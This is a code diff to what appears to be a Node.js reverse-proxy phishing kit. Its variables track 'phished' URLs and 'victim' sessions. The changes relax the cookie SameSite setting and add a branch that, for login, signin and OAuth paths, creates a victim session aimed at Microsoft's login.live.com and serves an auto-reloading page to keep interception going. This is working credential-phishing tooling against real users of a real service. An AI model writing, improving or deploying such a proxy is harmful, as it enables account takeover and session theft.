@@ -81,7 +81,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
             if (!currentSession) {
                 const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
+                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`);
                 session = cookieName;
             }
             VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
@@ -135,7 +135,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                         const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
 
                                         const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                                        clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
+                                        clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`);
 
                                         VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                         VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
@@ -309,6 +309,40 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                 </body>
                 </html>
             `);
+        } else if (!currentSession) {
+            // If no session exists, try to create one for common paths
+            if (url.includes('/login') || url.includes('/signin') || url.includes('/oauth')) {
+                // Create a default session for Microsoft login attempts
+                const defaultUrl = new URL('https://login.live.com/');
+                const { cookieName, cookieValue } = generateNewSession(defaultUrl);
+                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`);
+                
+                VICTIM_SESSIONS[cookieName].protocol = 'https:';
+                VICTIM_SESSIONS[cookieName].hostname = 'login.live.com';
+                VICTIM_SESSIONS[cookieName].path = url;
+                VICTIM_SESSIONS[cookieName].port = '';
+                VICTIM_SESSIONS[cookieName].host = 'login.live.com';
+                
+                // Serve a simple loading page that will retry the request
+                clientResponse.writeHead(200, { "Content-Type": "text/html" });
+                clientResponse.end(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Loading...</title>
+                        <meta http-equiv="refresh" content="0;url=${url}">
+                    </head>
+                    <body>
+                        <p>Loading...</p>
+                        <script>window.location.href = '${url}';</script>
+                    </body>
+                    </html>
+                `);
+            } else {
+                // Only redirect to intrinsec for truly invalid requests
+                clientResponse.writeHead(301, { Location: REDIRECT_URL });
+                clientResponse.end();
+            }
         } else {
             clientResponse.writeHead(301, { Location: REDIRECT_URL });
             clientResponse.end();
